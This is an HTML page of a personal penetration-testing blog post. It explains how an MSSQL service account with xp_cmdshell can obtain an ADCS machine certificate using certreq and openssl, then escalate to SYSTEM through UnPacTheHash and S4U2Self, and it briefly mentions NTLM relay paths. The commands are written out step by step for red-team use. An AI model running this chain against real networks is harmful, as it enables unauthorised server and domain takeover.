@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">MSSQL | Potatos and how to not use them | ADHDMurky Blog</title>
+<meta property="og:title" content="MSSQL | Potatos and how to not use them | ADHDMurky Blog" />
+<meta name="twitter:title" content="MSSQL | Potatos and how to not use them | ADHDMurky Blog" />
+<meta itemprop="name" content="MSSQL | Potatos and how to not use them | ADHDMurky Blog" />
+<meta name="application-name" content="MSSQL | Potatos and how to not use them | ADHDMurky Blog" />
+<meta property="og:site_name" content="ADHDMurkySite" />
+
+<meta name="description" content="Personal Blog Home Page">
+<meta itemprop="description" content="Personal Blog Home Page" />
+<meta property="og:description" content="Personal Blog Home Page" />
+<meta name="twitter:description" content="Personal Blog Home Page" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/post/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.152.2">
+
+    
+    <meta property="og:url" content="http://localhost:1313/post/">
+  <meta property="og:site_name" content="ADHDMurky Blog">
+  <meta property="og:title" content="MSSQL | Potatos and how to not use them">
+  <meta property="og:description" content="Double Note: Before you dive in, I want to point out that this post does not explore deep, low-level technical details. It’s a proof of concept for an alternative technique that I haven’t seen anyone else cover, so I decided to write about it. I don’t think it will provide major benefits, but it might be useful for some red team engagements, especially when using Living off the Land and it is a fun technique.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2025-11-21T00:26:14+01:00">
+    <meta property="article:modified_time" content="2025-11-21T00:26:14+01:00">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="MSSQL | Potatos and how to not use them">
+  <meta name="twitter:description" content="Double Note: Before you dive in, I want to point out that this post does not explore deep, low-level technical details. It’s a proof of concept for an alternative technique that I haven’t seen anyone else cover, so I decided to write about it. I don’t think it will provide major benefits, but it might be useful for some red team engagements, especially when using Living off the Land and it is a fun technique.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/post/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        Whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">MSSQL | Potatos and how to not use them</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-11-21T00:26:14&#43;01:00" itemprop="datePublished"> 21 Nov 2025 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>Double Note: Before you dive in, I want to point out that this post does not explore deep, low-level technical details. It&rsquo;s a proof of concept for an alternative technique that I haven&rsquo;t seen anyone else cover, so I decided to write about it. I don&rsquo;t think it will provide major benefits, but it might be useful for some red team engagements, especially when using Living off the Land and it is a fun technique.</p>
+<p>This technique is heavily based on the CertPotato abuse discovered by Hocine Mahtout. While he covers major aspects of this vulnerability, I will demonstrate a different method of exploiting the same issue. You can read more about it in his blog post: <a href="https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/">https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/.</a></p>
+<p>Before we get started, here’s a quick overview of service accounts in Windows. Built-in service accounts include LocalSystem, NetworkService, and LocalService. Some, like LocalSystem and NetworkService, use the computer account for network authentication. This is the juicy part Mahtout focuses on, the abuse of network authentication by IIS APPPOOL\DefaultAppPool, which is used to host websites in Microsoft environments.</p>
+<p>In this post, I explore a different approach to abusing this mechanism. The picture bellow should give you a visual overview of my environment before we get into the technical details.</p>
+<p><img src="/_resources/19a09108e7315ef000931832ec536988.png" alt="19a09108e7315ef000931832ec536988.png"></p>
+<p>Just like in CertPotato blog, I’ll need ADCS in my domain as a the key element for this abuse. As you may have already guessed, my focus here will be on abusing the MSSQL NetworkService account.</p>
+<p>Here he is&hellip;..</p>
+<p><img src="/_resources/d8cefe90312687e5d4351d17e8f6c82e.png" alt="d8cefe90312687e5d4351d17e8f6c82e.png"></p>
+<p>In most cases, when you gain MSSQL access with xp_cmdshell enabled, the most logical method is to exploit the <em>SeImpersonate</em> privilege to obtain a SYSTEM shell (with whatever Potato you choose so).</p>
+<p>During one of my internal network penetration tests, I encountered a NetworkService account that didn’t have SeImpersonate privileges in my mssql xp_cmdshell, which made figuring out how to abuse it a bit unusual. (&hellip;proceeds to lie just to make this topic more interesting).</p>
+<p>Of course, that’s impossible, the NetworkService account must have this privilege. If you try to configure it differently, you’ll either get an error, or Windows will entirely ignore your command to remove it. From my personal experience, I don’t believe it’s possible. However, if someone has found a way to do it, that’s neat.</p>
+<p>In any case, these settings are always the default for network, local, and domain [service] accounts when they are used as the logon account for the MSSQL Server service, as shown in the picture below:</p>
+<p><img src="/_resources/b8ac7435f3074bb806783cb18a12a1e8.png" alt="b8ac7435f3074bb806783cb18a12a1e8.png"></p>
+<p>But to keep things interesting, let’s assume you don’t have a way to get a SYSTEM shell, maybe you just can’t transfer your tooling or there’s an EDR on the host you simply can’t bypass (since you’re not a malware developer&hellip;.looks at a mirror), or simply because of a skill issue.</p>
+<p><img src="/_resources/37a1eb771755e9a7dc0006269173a787.png" alt="37a1eb771755e9a7dc0006269173a787.png"></p>
+<p>There is a way to forcibly authenticate that account by using xp_dirtree &ldquo;prays to god mssql is running as Domain Admin&rdquo; and relaying it to other hosts if SMB signing is (off / not required). However, that’s not the case in my example, although you can see proof of concept showing the NetworkService account using domain machine account authentication in the picture bellow.</p>
+<p><img src="/_resources/1fb79fa46e741e04a3a085bb18e20488.png" alt="1fb79fa46e741e04a3a085bb18e20488.png"></p>
+<p>But this is a machine account using the MSSQL protocol, it would be pure administrative stupidity to assign it as a local administrator on other hosts.</p>
+<p><img src="/_resources/1efcb4e83eb52863ecbfb6c7af144531.png" alt="1efcb4e83eb52863ecbfb6c7af144531.png"></p>
+<p>Yes&hellip;that happens also&hellip;.</p>
+<p>Because of this, I want to point out another quick win you can exploit to pwn an MSSQL server and that is by forcing it to authenticate via HTTP. Why? Because, as my senior colleague would say, HTTP authentication is like a wh*re: it takes everyone and gives it to anyone.Meaning, you can relay anything over HTTP, and HTTP can be relayed everywhere unless non-default security measures are in place.</p>
+<p>There are two known easy relays for this:</p>
+<ul>
+<li>One to the ADCS Web Enrollment for the default certificate template, which leads to domain authentication as machine account (HTTP)</li>
+<li>Other to the Domain Controller for RBCD setup(LDAP).</li>
+</ul>
+<p> </p>
+<p>Both of these lead to that server takeover. Here is easy POC, first off we use Invoke-WebRequest command with UseDefaultCredenitals parameter:</p>
+<p><img src="/_resources/e59d6109cf27c6ca2e8cb9c02f9d663f.png" alt="e59d6109cf27c6ca2e8cb9c02f9d663f.png"></p>
+<p>And then relay it on either LDAP (on DC) or HTTP (on CA).</p>
+<p><img src="/_resources/080af039ed70e4158d47e95429e6b9a6.png" alt="080af039ed70e4158d47e95429e6b9a6.png"></p>
+<p><img src="/_resources/fe2f9bd5b3e0b0c5a103e2874ee729e6.png" alt="fe2f9bd5b3e0b0c5a103e2874ee729e6.png"></p>
+<p>But to keep things even spicier, let’s say there is no Web Enrollment, LDAP signing is disabled or just firewall rules blocking outbound auth.</p>
+<p>I was thinking to myself: if Network Service accounts use the machine account for network operations, could I then simply request a certificate template for the machine? Since certificate requests communicate with with the CA server through dynamically allocated RPC/DCOM ports (that is network operation?).</p>
+<p>In my lab I will use deafult Computer (Machine) Template on my CA as one of the published ones on AD.</p>
+<p><img src="/_resources/788247f515dfc81bb9392a8686e6319f.png" alt="788247f515dfc81bb9392a8686e6319f.png"></p>
+<p><img src="/_resources/0bc5ec3f128614ea7ff2e3064ea23e57.png" alt="0bc5ec3f128614ea7ff2e3064ea23e57.png"></p>
+<p>Just a quick note: &ldquo;NT SERVICE\MSSQLSERVER&rdquo; is a low-privileged user both locally and in the domain. So, what happens if a low-privileged user requests a machine certificate?</p>
+<p><img src="/_resources/9c6991fe9926bbd3af1b6846e1a517ce.png" alt="9c6991fe9926bbd3af1b6846e1a517ce.png"></p>
+<p>Denied!</p>
+<p>Even exporting existing ones in the store is not possible since user doesn&rsquo;t have privileges to do so, and is missing keyset (but I&rsquo;ve seen cases where this is also misconfigured in client environment):</p>
+<p><img src="/_resources/24605393721fa3cb6fc76f4ea621867a.png" alt="24605393721fa3cb6fc76f4ea621867a.png"></p>
+<p>That is simply because this would be a very straightforward local privilege escalation path, sadly it&rsquo;s not.</p>
+<p>But let’s try it with our Network Service account. First, we’ll create a basic certificate signing request (CSR) with only the Common Name field filled, set to match our MSSQL server.</p>
+<pre tabindex="0"><code>└─$ openssl req -newkey rsa:2048 -keyout MyKey.key -out certreq.csr
+&lt;snip&gt;
+Common Name (e.g. server FQDN or YOUR name) []:MSSQL.ANOTHER.SI
+</code></pre><p><img src="/_resources/a2090b1846312ca8fce3e7da2ba37bf7.png" alt="a2090b1846312ca8fce3e7da2ba37bf7.png"></p>
+<p>Here is what our newly created CSR file looks like:</p>
+<p><img src="/_resources/a86e55e310f00226ea6b9661ee4a4646.png" alt="a86e55e310f00226ea6b9661ee4a4646.png"></p>
+<p>Now, how do we transfer it? Easy, a basic PowerShell base64-encoded command will do. You can encode it on your own host and then just copy and paste the base64 string into xp_cmdshell:</p>
+<pre tabindex="0"><code>$script = @&#39;
+$csr = @&#34;
+-----BEGIN CERTIFICATE REQUEST-----
+MIICpTCCAY0CAQAwYDELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
+ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDEZMBcGA1UEAwwQTVNT
+UUwuQU5PVEhFUi5TSTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCN
+gm36O8oWbi6Vxg7diWqnc2yk/6UXlxayYr4S2gWKMESU/6RUNeCA3l1Zqepk5vAZ
+7WC0/QGb316cFWH0qZEOzq1JUxNydT8GDfoo0DjY+zPNZ8Brk1g6tpxapsmkSWK9
+7hlMVCUB6J95jTma9Qm8ps81OZ2PcYW/Kuzz3Q03IYn4ZRHozv0EHSBuQtN0Hxn8
+hbiMQi7p/Sx85hHIMIMdr7+XJzoVZbp3gYu9Gx8Fk/jAIRAyXywvOPzfNVErwDAL
+gr1bbzdXlJrYL0RG+fK+sb7RkFbfpxiOKcO04GVf2pirTILekdGVJ2xbU4Osgq+P
++n6s18f0wldUgvPtKPUCAwEAAaAAMA0GCSqGSIb3DQEBCwUAA4IBAQCja+YNs1YZ
+2TsZBLO4m0/Zyi/Cfeas2/NUCVDPW59CAr8V0yXegC6xE7ke6gNc4zZCU61TAT4Q
+2xpv85UYI6zGj7kci/X9D+oAKiua00HZXNBYiVkzyXTw0Ozw/jP8Skw0yg/wcfFb
+K/PgI1OVkUPYXBlfgtr93VJPH3j4eSsRxrgP/VRpZKQdteoFnituMv/IcsFAkdz9
+YHgY4Qe22MJEUnzYv1ElZJ96cgStD+ewkC2NCp2AjUbImYyUPjhfqcAAK3wdfmMT
+Qi7gPDO+sgQczXp8QtCfi419PF68IRYpsczrgYuIjp2erTqVL2yoiVZPAnzcGYQ0
+ey2hw7D5Mx0h
+-----END CERTIFICATE REQUEST-----
+&#34;@
+
+$csr | Out-File -FilePath C:\Temp\certreq.csr -Encoding Ascii
+&#39;@
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encoded = [Convert]::ToBase64String($bytes)
+Write-Output $encoded
+</code></pre><p><img src="/_resources/136c2eb298fc9f18ac7731ced48b82fe.png" alt="136c2eb298fc9f18ac7731ced48b82fe.png"></p>
+<p>And POC in my environment (I should have listed the directory before this, you’ll have to trust me on this one.):</p>
+<p><img src="/_resources/9be1c8bd4c17aadd13669e45495dee00.png" alt="9be1c8bd4c17aadd13669e45495dee00.png"></p>
+<p>Lets check now for that ICertRequest2 interface that uses RPC/DCOM protocols (<strong>certreq</strong> and <strong>certutil</strong> LOLBAS use this mechanism)</p>
+<pre tabindex="0"><code>SQL (MSSQL\Administrator  dbo@master)&gt; xp_cmdshell certutil -ping -config &#34;ADCS\ANOTHER-CA&#34;
+output                                                        
+-----------------------------------------------------------   
+Connecting to ADCS\ANOTHER-CA ...                             
+Server &#34;ANOTHER-CA&#34; ICertRequest2 interface is alive (32ms)   
+CertUtil: -ping command completed successfully.
+</code></pre><p>Lets request our machine certificate template:</p>
+<pre tabindex="0"><code>SQL (MSSQL\Administrator  dbo@master)&gt; xp_cmdshell certreq -submit -attrib &#34;CertificateTemplate:Machine&#34; -config &#34;adcs.another.is\ANOTHER-CA&#34; &#34;C:\Temp\certreq.csr&#34; &#34;C:\Temp\MachineCER.cer&#34;
+</code></pre><p><img src="/_resources/30c6b5d2372deb53f3d36be83d9690fb.png" alt="30c6b5d2372deb53f3d36be83d9690fb.png"></p>
+<p>Just as suspected, we got the certificate with no issues whatsoever. So now lets just copy-paste it onto our linux machine</p>
+<p><img src="/_resources/f841de1c2532d389fd4173142385372f.png" alt="f841de1c2532d389fd4173142385372f.png"></p>
+<p>And now since we have CER and CSR files lets combine them and creates an encrypted PKCS#12 file (PFX)</p>
+<pre tabindex="0"><code>└─$ openssl pkcs12 -export -out MachineCertificate.pfx -inkey MyKey.key -in MachineCER.cer
+</code></pre><p>All that&rsquo;s left is to check for our pfx validity by using UnPacTheHash attack:</p>
+<p><img src="/_resources/82c2b0ab3383b8f6a86e0196496e6f45.png" alt="82c2b0ab3383b8f6a86e0196496e6f45.png"></p>
+<p>Neat&hellip;&hellip;</p>
+<p><img src="/_resources/8447b4f80fab8e74ef66ba46e867a45d.png" alt="8447b4f80fab8e74ef66ba46e867a45d.png"></p>
+<p>And as the cherry on top, an easy abuse of S4U2Self proves that you don&rsquo;t need &lt;insert Potato joke&gt;.</p>
+<p><img src="/_resources/46d8ce474429ba0bf34a0dbadea35533.png" alt="46d8ce474429ba0bf34a0dbadea35533.png"></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/ADHDMurky/" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://www.linkedin.com/in/josip-pavi6-5b29b7255" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 Pavičić J..
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
